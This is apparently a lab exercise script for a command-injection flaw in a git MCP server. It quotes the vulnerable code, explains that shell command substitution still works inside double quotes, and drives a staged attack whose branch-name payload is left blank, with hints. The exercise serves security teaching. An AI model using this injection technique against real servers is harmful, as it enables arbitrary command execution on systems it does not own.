"""attack_git_mcp.py — YOUR turn.  cyanheads/git-mcp-server <= 2.1.4 · CVE-2025-53107.

The server builds a shell command for git_init and runs it through a shell,
escaping only double-quotes in the branch name:

    const branchNameToUse = input.initialBranch || "main";
    command += ` -b "${branchNameToUse.replace(/"/g, '\\"')}"`;   // only " is escaped
    command += ` "${targetPath}"`;
    const { stdout } = await execAsync(command);                  // runs via /bin/sh

This script already (A) initializes a repo with a benign branch name and
(C) self-verifies by reading the server's own git_status. Your job is the
weaponized branch name in Stage B.

Key insight: they escaped the double-quotes, but you do NOT need to break out
of the quotes. Some shell constructs are evaluated INSIDE double quotes. Find
one that runs a command, and make that command drop a file into the repo dir
(REPO below) so git_status will show it.

    python real-servers/attack_git_mcp.py --url http://127.0.0.1:8090/sse \
        --path /tmp/gitmcp_lab_repo

Success = Stage C's git_status lists your marker file as untracked.
"""

import argparse
import sys

from _mcp_sse import banner, list_tool_names, mcp_session, run, text_of

DEFAULT_URL = "http://127.0.0.1:8090/sse"
MARKER = "INJECTED_BY_53107.txt"


def build_payload(repo_path: str) -> str:
    """Return the malicious `initialBranch` value.

    It must, as a side effect, create the file  <repo_path>/INJECTED_BY_53107.txt
    via a command the shell runs while still inside the double-quoted -b value.
    """
    # ========================================================================
    # YOUR JOB starts here.
    # Build a branch-name string that begins like a normal name but contains a
    # shell construct which executes `touch <repo_path>/<MARKER>`.
    # Hint: which two shell constructs perform command substitution *inside*
    #       double quotes, where `;` and a literal `"` would not help you?
    return ""   # TODO: e.g. f'main???touch {repo_path}/{MARKER}???'
    # YOUR JOB ends here.
    # ========================================================================


async def attack(url: str, repo_path: str) -> int:
    async with mcp_session(url) as s:
        banner("Recon · confirm git_init + git_status are exposed")
        names = await list_tool_names(s)
        print("tools:", ", ".join(names))
        if "git_init" not in names or "git_status" not in names:
            print("✗ expected git_init + git_status — is this git-mcp-server?")
            return 1

        banner("Stage A · benign · git_init creates the target dir")
        print(text_of(await s.call_tool("git_init",
                                        {"path": repo_path, "initialBranch": "main"})))

        payload = build_payload(repo_path)
        if not payload:
            print("\n(!) build_payload returned '' — fill in 'YOUR JOB' and re-run.")
            return 1

        banner("Stage B · YOUR weaponized initialBranch")
        print("initialBranch:", payload)
        print(text_of(await s.call_tool("git_init",
                                        {"path": repo_path, "initialBranch": payload})))

        banner("Stage C · self-verify via the server's own git_status")
        st = text_of(await s.call_tool("git_status", {"path": repo_path}))
        print(st)

        print()
        if MARKER in st:
            print(f"✓ ATTACK SUCCEEDED — {MARKER} was created by an injected command.")
            return 0
        print(f"✗ {MARKER} not in git_status — your branch name didn't execute. "
              "Re-read the hint about double quotes.")
        return 1


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default=DEFAULT_URL)
    ap.add_argument("--path", default="/tmp/gitmcp_lab_repo",
                    help="repo path ON THE SERVER")
    args = ap.parse_args()
    return run(attack(args.url, args.path))


if __name__ == "__main__":
    sys.exit(main())
